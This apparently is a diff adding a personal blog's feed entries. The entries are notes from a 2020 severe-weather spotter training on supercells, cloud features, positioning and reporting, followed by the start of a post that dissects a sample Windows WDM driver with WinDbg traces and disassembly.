+      &lt;li&gt;LP supercells
+        &lt;ul&gt;
+          &lt;li&gt;Low precipitation production
+            &lt;ul&gt;
+              &lt;li&gt;Cant be easily seen on radar&lt;/li&gt;
+              &lt;li&gt;Updarfts small in size&lt;/li&gt;
+              &lt;li&gt;Very large hail threat from vault area&lt;/li&gt;
+              &lt;li&gt;Tornadoes not a frequent threat&lt;/li&gt;
+              &lt;li&gt;Tornadoes will be less intense than classic supercell&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;HP supercells
+        &lt;ul&gt;
+          &lt;li&gt;High precipitation&lt;/li&gt;
+          &lt;li&gt;Extremely dangerous, especially for spotters
+            &lt;ul&gt;
+              &lt;li&gt;No ideal spots to see tornadoes forming&lt;/li&gt;
+              &lt;li&gt;Prolific flash flood producers&lt;/li&gt;
+              &lt;li&gt;Strong downbursts&lt;/li&gt;
+              &lt;li&gt;Copious hail producers&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Updrafts and Downdrafts
+    &lt;ul&gt;
+      &lt;li&gt;Wind shear, causing the updraft to lean over, causing rain and hail to fall down front of the the updraft&lt;/li&gt;
+      &lt;li&gt;Upraft area is location of largest hail and possibility of tornado&lt;/li&gt;
+      &lt;li&gt;E.g. Rain free base with striations in the back, downpour in the front&lt;/li&gt;
+      &lt;li&gt;Near the intersection between rain edge and updraft area is most likely area for tornado&lt;/li&gt;
+      &lt;li&gt;Rain will highlight the rotating updraft on the radar&lt;/li&gt;
+      &lt;li&gt;Farther away the storm is, the smaller the hook echo will look&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;anvil-clouds&quot;&gt;Anvil clouds&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Formed as storm updraft expands&lt;/li&gt;
+  &lt;li&gt;Can be used to indicate strength of updraft&lt;/li&gt;
+  &lt;li&gt;pulse like (weak)? thin? thick? back sheared? VERY STRONG
+    &lt;h3 id=&quot;mammatus&quot;&gt;Mammatus&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Not an indicator of severity&lt;/li&gt;
+  &lt;li&gt;Formed by differential evaporation
+    &lt;h3 id=&quot;convective-updraft&quot;&gt;Convective updraft&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Primary mature updraft&lt;/li&gt;
+  &lt;li&gt;Visually gaugable to see strength/health&lt;/li&gt;
+  &lt;li&gt;Best view is behind the storm&lt;/li&gt;
+  &lt;li&gt;If the updraft is protruding above the anvil indicate high strength&lt;/li&gt;
+  &lt;li&gt;Fluffier, looser cloud are likely weaker
+    &lt;h3 id=&quot;flanking-line&quot;&gt;Flanking Line&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;New towers that typically extend southwest of main rotating updraft&lt;/li&gt;
+  &lt;li&gt;Towering cumulus leading to the main updraft&lt;/li&gt;
+  &lt;li&gt;Watch for subsequent updrafts along the flanking line
+    &lt;h3 id=&quot;updraft-vault&quot;&gt;Updraft Vault&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Small localized area between downdraft (where rain is falling) and updraft&lt;/li&gt;
+  &lt;li&gt;If you can see the vault that means you are very close
+    &lt;ul&gt;
+      &lt;li&gt;you should be very aware of your situation&lt;/li&gt;
+      &lt;li&gt;Wind at your back&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Area of possibly largest hail
+    &lt;h3 id=&quot;rain-free-base&quot;&gt;Rain Free base&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Depicts where air is rising&lt;/li&gt;
+  &lt;li&gt;Generally smooth, can exist for several hours&lt;/li&gt;
+  &lt;li&gt;Focus on this region for tornadic potential&lt;/li&gt;
+  &lt;li&gt;Watch for lowering wall cloud&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Not to be confused with a wall cloud&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;These are large scale features of storms&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;smaller-scale-storm-features&quot;&gt;Smaller Scale Storm Features&lt;/h2&gt;
+&lt;h3 id=&quot;wall-cloud&quot;&gt;Wall cloud&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;localized lowering of main updraft cloud base&lt;/li&gt;
+  &lt;li&gt;Cyclonic rotation&lt;/li&gt;
+  &lt;li&gt;Small compared to storm&lt;/li&gt;
+  &lt;li&gt;Usual distinct slope towards FFD&lt;/li&gt;
+  &lt;li&gt;Often injesting humid, rain cooled air
+    &lt;ul&gt;
+      &lt;li&gt;Lifting air cools, increases in relatively humidity&lt;/li&gt;
+      &lt;li&gt;As it approaches 100% humidity, undergoes phase change and becomes cloud&lt;/li&gt;
+      &lt;li&gt;In wall clouds, air is condesnsing into a cloud at a lower altitude,&lt;/li&gt;
+      &lt;li&gt;typically attached to base of updraft.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;several hundred yards to mile&lt;/li&gt;
+  &lt;li&gt;Usual distinct slope to FFD&lt;/li&gt;
+  &lt;li&gt;Distinct from shelf cloud, which slopes away from where its raining&lt;/li&gt;
+  &lt;li&gt;Slopes toward rain area&lt;/li&gt;
+  &lt;li&gt;Dangerous wall clouds
+    &lt;ul&gt;
+      &lt;li&gt;Persistent rotation&lt;/li&gt;
+      &lt;li&gt;Lowering over time&lt;/li&gt;
+      &lt;li&gt;Wind is typicall at your back toward the wall cloud&lt;/li&gt;
+      &lt;li&gt;If the wind at your back intensifies toward the wall coud signals intensifying wall cloud&lt;/li&gt;
+      &lt;li&gt;If the wind start coming back at your faces, it may be decrease in intensity&lt;/li&gt;
+      &lt;li&gt;Either way, check your surroundings&lt;/li&gt;
+      &lt;li&gt;Constantly in a state of change&lt;/li&gt;
+      &lt;li&gt;Good idea to see if you can see dust rising into wall cloud. If so, youre likely too close&lt;/li&gt;
+      &lt;li&gt;shapes
+        &lt;ul&gt;
+          &lt;li&gt;small, big, organized, unorganized&lt;/li&gt;
+          &lt;li&gt;Isolated lowering from main base of the updraft&lt;/li&gt;
+          &lt;li&gt;Usually sloping toward where rain is occuring&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;When you see something, notice and report the trends&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tail-cloud&quot;&gt;Tail Cloud&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Scary looking clouds, horizontal cloud&lt;/li&gt;
+  &lt;li&gt;I.e. inflow cloud&lt;/li&gt;
+  &lt;li&gt;Often laminar, tube shaped&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;rear-flank-downdraft&quot;&gt;Rear Flank Downdraft&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Region of dry air subsiding on the back of, and wrapping around a cyclone&lt;/li&gt;
+  &lt;li&gt;Important visual precursor to tornadogenesis&lt;/li&gt;
+  &lt;li&gt;Sinking air dries and warms, erodes cloud&lt;/li&gt;
+  &lt;li&gt;Can produce winds in excess of 60 mph&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;funnel-cloud&quot;&gt;Funnel Cloud&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tubular shaped column of rotating cloud that does not reach the ground&lt;/li&gt;
+  &lt;li&gt;Look for:
+    &lt;ul&gt;
+      &lt;li&gt;Rotation&lt;/li&gt;
+      &lt;li&gt;Persistence &amp;amp; organization&lt;/li&gt;
+      &lt;li&gt;Changes &amp;amp; trends&lt;/li&gt;
+      &lt;li&gt;No debris&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;once more than halfway to the ground, pay attention to whats happening at the ground level
+    &lt;ul&gt;
+      &lt;li&gt;Swirls of dust and debris at ground level indicate tornado&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;changes in closeness to ground can be very quick&lt;/li&gt;
+  &lt;li&gt;sometimes rather disorganized looking&lt;/li&gt;
+  &lt;li&gt;somestimes there can be multiple&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tornado&quot;&gt;Tornado&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;violently rotating column of air in contact with ground and extending from a cumulonimbus cloud&lt;/li&gt;
+  &lt;li&gt;You can have a violently rotating column of air without a visible funnel&lt;/li&gt;
+  &lt;li&gt;Electronic devices will destroy night vision&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;gustnado&quot;&gt;Gustnado&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Swirling dust&lt;/li&gt;
+  &lt;li&gt;Typically caused by an outrush of air (outflow/gust front) on leading edge of outflow&lt;/li&gt;
+  &lt;li&gt;Moves away from the storm&lt;/li&gt;
+  &lt;li&gt;Not connected to cloud base // not a tornado&lt;/li&gt;
+  &lt;li&gt;Still dangerous&lt;/li&gt;
+  &lt;li&gt;Report&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;landspout&quot;&gt;Landspout&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;small tornadoes&lt;/li&gt;
+  &lt;li&gt;attached to high based thunderstorms&lt;/li&gt;
+  &lt;li&gt;weak, often short lived&lt;/li&gt;
+  &lt;li&gt;often with LP supercells&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;scud-clouds--scary-looking-clouds&quot;&gt;Scud clouds / scary looking clouds&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Shelf clouds
+    &lt;ul&gt;
+      &lt;li&gt;Low, horizontal wedge shaped associated with gust front&lt;/li&gt;
+      &lt;li&gt;Attached to the base of the parent cloud&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Rain shafts
+    &lt;ul&gt;
+      &lt;li&gt;Visible column of rain falling from the base of clouds&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Virga&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;radar&quot;&gt;Radar&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;The only live data is what you see out the window
+    &lt;ul&gt;
+      &lt;li&gt;Radar is late&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;safety&quot;&gt;Safety&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tunnel vision&lt;/li&gt;
+  &lt;li&gt;Be aware of the “Dome” surrounding you&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;positioning-and-viewing&quot;&gt;Positioning and Viewing&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Updraft and downdraft area&lt;/li&gt;
+  &lt;li&gt;Where they meet is the main action area&lt;/li&gt;
+  &lt;li&gt;Squall
+    &lt;ul&gt;
+      &lt;li&gt;Face the line through the windshield. Dont let it broadsie you. (dont get flipped)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Supercell
+    &lt;ul&gt;
+      &lt;li&gt;Position yourself perpendicular. eg. SW to NE supercell, be SE&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Avoid the downshaft&lt;/li&gt;
+  &lt;li&gt;Best distance from the action area is subjective. Generally 1-4 miles. Rarely 1-2&lt;/li&gt;
+  &lt;li&gt;Always know which way its moving&lt;/li&gt;
+  &lt;li&gt;Velocity isnt constant&lt;/li&gt;
+  &lt;li&gt;supercells have a habit of splitting
+    &lt;ul&gt;
+      &lt;li&gt;Right mover vs left mover.
+        &lt;ul&gt;
+          &lt;li&gt;Right: tornado likely&lt;/li&gt;
+          &lt;li&gt;Left: Large hail&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;If positioned SE of a right mover, quickly move out of the path!
+        &lt;ul&gt;
+          &lt;li&gt;You need to go south&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;All bets are off with HP supercells
+    &lt;ul&gt;
+      &lt;li&gt;typically rainwrapped, no visibility&lt;/li&gt;
+      &lt;li&gt;no safe location for spotting&lt;/li&gt;
+      &lt;li&gt;stay out of its way&lt;/li&gt;
+      &lt;li&gt;Dont even think of going into the rain area&lt;/li&gt;
+      &lt;li&gt;you wont see anything until its too late&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Power Flashes
+    &lt;ul&gt;
+      &lt;li&gt;Dont always mean tornadoes. Power lines might be touching each other, limbs might be touching transformers&lt;/li&gt;
+      &lt;li&gt;Might just be strong winds&lt;/li&gt;
+      &lt;li&gt;Report power flashes
+        &lt;ul&gt;
+          &lt;li&gt;Check if it illuminates something above&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Report what you SEE&lt;/li&gt;
+      &lt;li&gt;E.x. using wind turbines as a point of reference for change in direction of a moving object&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Tip to do a better job
+    &lt;ul&gt;
+      &lt;li&gt;Find out where your spoting location is ahead of time
+        &lt;ul&gt;
+          &lt;li&gt;Look for landmarks&lt;/li&gt;
+          &lt;li&gt;Determine how far they are from the spotting position&lt;/li&gt;
+          &lt;li&gt;This can keep you safe AND increase report accuracy&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;A good spotter reports:
+    &lt;ul&gt;
+      &lt;li&gt;hail&lt;/li&gt;
+      &lt;li&gt;Wind gusts&lt;/li&gt;
+      &lt;li&gt;Storm damage&lt;/li&gt;
+      &lt;li&gt;Flooding&lt;/li&gt;
+      &lt;li&gt;Wall clouds&lt;/li&gt;
+      &lt;li&gt;Funnel clouds&lt;/li&gt;
+      &lt;li&gt;Tornado&lt;/li&gt;
+      &lt;li&gt;Power flashes
+        &lt;ul&gt;
+          &lt;li&gt;Are power flashes changing with time&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Report:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;When, how long it lasts&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Where the item is, where you are&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Dont assume they already know&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;You may be the only person that has a clear view&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Hail:
+    &lt;ul&gt;
+      &lt;li&gt;We want to know the largest size that fell&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Wind Speed:
+    &lt;ul&gt;
+      &lt;li&gt;Specify if wind speed is estimated or measured&lt;/li&gt;
+      &lt;li&gt;Spotters tend to overestimate wind speed&lt;/li&gt;
+      &lt;li&gt;Measuring outside vehicle is not recommended&lt;/li&gt;
+      &lt;li&gt;25-31 mph: large branches in motion&lt;/li&gt;
+      &lt;li&gt;31-?: whole trees&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Wind damage:
+    &lt;ul&gt;
+      &lt;li&gt;report damage&lt;/li&gt;
+      &lt;li&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Tornado Report
+    &lt;ul&gt;
+      &lt;li&gt;Report only what you see&lt;/li&gt;
+      &lt;li&gt;Report YOUR location&lt;/li&gt;
+      &lt;li&gt;report the location of the tornado&lt;/li&gt;
+      &lt;li&gt;time of the tornado&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Flood report
+    &lt;ul&gt;
+      &lt;li&gt;How dep is the water&lt;/li&gt;
+      &lt;li&gt;Is the road closed&lt;/li&gt;
+      &lt;li&gt;Are homes or structures threateened&lt;/li&gt;
+      &lt;li&gt;Is road or bridges washed out&lt;/li&gt;
+      &lt;li&gt;Is water covering the road&lt;/li&gt;
+      &lt;li&gt;Are resuces ocurring&lt;/li&gt;
+      &lt;li&gt;Is water moving swiftly&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;reporting&quot;&gt;Reporting&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;call 405-325-3816
+24/7/365&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Spotternetwork.org&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;okay to report after the fact&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;twitter&lt;/li&gt;
+  &lt;li&gt;amateur radio: this guys callsign WX5OUN&lt;/li&gt;
+  &lt;li&gt;Non urgent reports: email/facebook&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
+&lt;p&gt;www.weather.gov/oun/spotter-referencematerials&lt;/p&gt;</content><author><name>Josh Finley</name></author><summary type="html">Notes on Severe Weather Spotter Training on 3-24-2020</summary></entry><entry><title type="html">Dissecting a Barebones WDM Driver</title><link href="http://localhost:4000/dissecting-wdm-drivers/" rel="alternate" type="text/html" title="Dissecting a Barebones WDM Driver" /><published>2020-03-16T00:05:28-05:00</published><updated>2020-03-16T00:05:28-05:00</updated><id>http://localhost:4000/dissecting-wdm-drivers</id><content type="html" xml:base="http://localhost:4000/dissecting-wdm-drivers/">&lt;p&gt;Chapter 4 of &lt;em&gt;Kernel Programming for Windows&lt;/em&gt; walks through the process of developing a driver “from start to finish”. This post is for quick notes on the dissection of this example driver, taken for learning purposes.&lt;/p&gt;
+
+&lt;h4 id=&quot;source-code&quot;&gt;Source Code&lt;/h4&gt;
+
+&lt;p&gt;The full source code for the project can be found on GitHub: &lt;a href=&quot;https://github.com/joshfinley/PriorityBooster&quot;&gt;https://github.com/joshfinley/PriorityBooster&lt;/a&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Table of Contents&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1. DriverEntry&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2. DriverObject&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3. DeviceObject&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4. IRP&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5. DeviceControl&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;1-driverentry&quot;&gt;1. DriverEntry&lt;/h2&gt;
+
+&lt;p&gt;Stack trace at driver entry:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; k
+ # Child-SP          RetAddr           Call Site
+00 ffffbe84`b6db7898 fffff800`3b235020 PriorityBooster!DriverEntry [C:\Users\finle\source\repos\PriorityBooster\PriorityBooster\Source.cpp @ 12] 
+01 ffffbe84`b6db78a0 fffff800`3e510c06 PriorityBooster!GsDriverEntry+0x20 [minkernel\tools\gs_support\kmodefastfail\gs_driverentry.c @ 47] 
+02 ffffbe84`b6db78d0 fffff800`3e51063e nt!IopLoadDriver+0x4c2
+03 ffffbe84`b6db7ab0 fffff800`3debd005 nt!IopLoadUnloadDriver+0x4e
+04 ffffbe84`b6db7af0 fffff800`3df2a7b5 nt!ExpWorkerThread+0x105
+05 ffffbe84`b6db7b90 fffff800`3dfc8b5a nt!PspSystemThreadStartup+0x55
+06 ffffbe84`b6db7be0 00000000`00000000 nt!KiStartSystemThread+0x2a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;gsdriverentry&quot;&gt;GsDriverEntry&lt;/h3&gt;
+&lt;p&gt;We can see that prior to the projects &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverEntry&lt;/code&gt; function being called, &lt;code class=&quot;highlighter-rouge&quot;&gt;GsDriverEntry&lt;/code&gt; is invoked:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; x PriorityBooster!GsDriverEntry
+fffff800`3b235000 PriorityBooster!GsDriverEntry (struct _DRIVER_OBJECT *, struct _UNICODE_STRING *)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And dissasembling this function shows:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; uf fffff800`3b235000
+PriorityBooster!GsDriverEntry [minkernel\tools\gs_support\kmodefastfail\gs_driverentry.c @ 43]:
+   43 fffff800`3b235000 48895c2408      mov     qword ptr [rsp+8],rbx
+   43 fffff800`3b235005 57              push    rdi
+   43 fffff800`3b235006 4883ec20        sub     rsp,20h
+   43 fffff800`3b23500a 488bda          mov     rbx,rdx
+   43 fffff800`3b23500d 488bf9          mov     rdi,rcx
+   45 fffff800`3b235010 e817000000      call    PriorityBooster!__security_init_cookie (fffff800`3b23502c)
+   46 fffff800`3b235015 488bd3          mov     rdx,rbx
+   46 fffff800`3b235018 488bcf          mov     rcx,rdi
+   46 fffff800`3b23501b e890c1ffff      call    PriorityBooster!DriverEntry (fffff800`3b2311b0)
+   47 fffff800`3b235020 488b5c2430      mov     rbx,qword ptr [rsp+30h]
+   47 fffff800`3b235025 4883c420        add     rsp,20h
+   47 fffff800`3b235029 5f              pop     rdi
+   47 fffff800`3b23502a c3              ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that this stub function &lt;code class=&quot;highlighter-rouge&quot;&gt;GsDriverEntry&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;accepts the same parameters as DriverEntry&lt;/li&gt;
+  &lt;li&gt;initializes the security cookie&lt;/li&gt;
+  &lt;li&gt;calls the user-created &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverEntry&lt;/code&gt; function.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Quickly, lets look at &lt;code class=&quot;highlighter-rouge&quot;&gt;__security_init_cookie&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PriorityBooster!__security_init_cookie [minkernel\tools\gs_support\kmodefastfail\gs_support.c @ 37]:
+fffff800`3b23502c 488b05cddfffff  mov     rax,qword ptr [PriorityBooster!__security_cookie (fffff800`3b233000)]
+fffff800`3b235033 4885c0          test    rax,rax
+fffff800`3b235036 741a            je      PriorityBooster!__security_init_cookie+0x26 (fffff800`3b235052)
+fffff800`3b235038 48b932a2df2d992b0000 mov rcx,2B992DDFA232h
+fffff800`3b235042 483bc1          cmp     rax,rcx
+fffff800`3b235045 740b            je      PriorityBooster!__security_init_cookie+0x26 (fffff800`3b235052)
+fffff800`3b235047 48f7d0          not     rax
+fffff800`3b23504a 488905b7dfffff  mov     qword ptr [PriorityBooster!__security_cookie_complement (fffff800`3b233008)],rax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And the corresponding source can be found &lt;a href=&quot;https://gist.github.com/joshfinley/7e01480ab70ade5f7d296cc4e37684e1&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ntioploaddriver&quot;&gt;nt!IopLoadDriver&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IopLoadDriver&lt;/code&gt; is an undocumented function in the family of Windows I/O Manager support functions.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;A listing of these functions can be found here: &lt;a href=&quot;https://gist.github.com/joshfinley/8a6a0cb09af32507f3c6157c16f8e30b&quot;&gt;https://gist.github.com/joshfinley/8a6a0cb09af32507f3c6157c16f8e30b&lt;/a&gt;.&lt;/li&gt;
+  &lt;li&gt;A listing of these prefixes can be found here: &lt;a href=&quot;https://gist.github.com/joshfinley/bc54df3c092e224ad08140cfd619fa2d&quot;&gt;https://gist.github.com/joshfinley/bc54df3c092e224ad08140cfd619fa2d&lt;/a&gt;.&lt;/li&gt;
+  &lt;li&gt;Finally, the fully dissasembly of &lt;code class=&quot;highlighter-rouge&quot;&gt;nt!IopLoadDriver&lt;/code&gt; can be found here: &lt;a href=&quot;https://gist.github.com/joshfinley/da2fd8039de1e97190f5ce2c9bd07bc4&quot;&gt;https://gist.github.com/joshfinley/da2fd8039de1e97190f5ce2c9bd07bc4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IopLoadDriver&lt;/code&gt; is used to call the driver entry function, as seen in the stack trace at the beginning of this post. It is used for &lt;code class=&quot;highlighter-rouge&quot;&gt;SERVICE_DEMAND&lt;/code&gt; driver entry. The corresponding function for boot loading drivers is &lt;code class=&quot;highlighter-rouge&quot;&gt;nt!IopInitializeBuiltInDriver&lt;/code&gt; (see &lt;a href=&quot;https://reverseengineering.stackexchange.com/a/2638&quot;&gt;https://reverseengineering.stackexchange.com/a/2638&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;From &lt;em&gt;Windows Internals&lt;/em&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;When the I/O manager kernel subsystem loads device drivers that HKLM\SYSTEM\Current-ControlSet\Services specifies, the I/O manager executes the function IopLoadDriver.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The function defintion for &lt;code class=&quot;highlighter-rouge&quot;&gt;IopLoadDriver&lt;/code&gt; looks something like this:&lt;/p&gt;
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;IopLoadDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;KeyHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;BOOLEAN&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;CheckForSafeBoot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;BOOLEAN&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;IsFilter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;OUT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverEntryStatus&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;see &lt;a href=&quot;https://github.com/joshfinley/ntoskrnl/blob/master/Io/iomgr/internal.c&quot;&gt;https://github.com/joshfinley/ntoskrnl/blob/master/Io/iomgr/internal.c&lt;/a&gt; (forked from the &lt;a href=&quot;https://github.com/Zer0Mem0ry/ntoskrnl/&quot;&gt;Windows Research Kernel&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
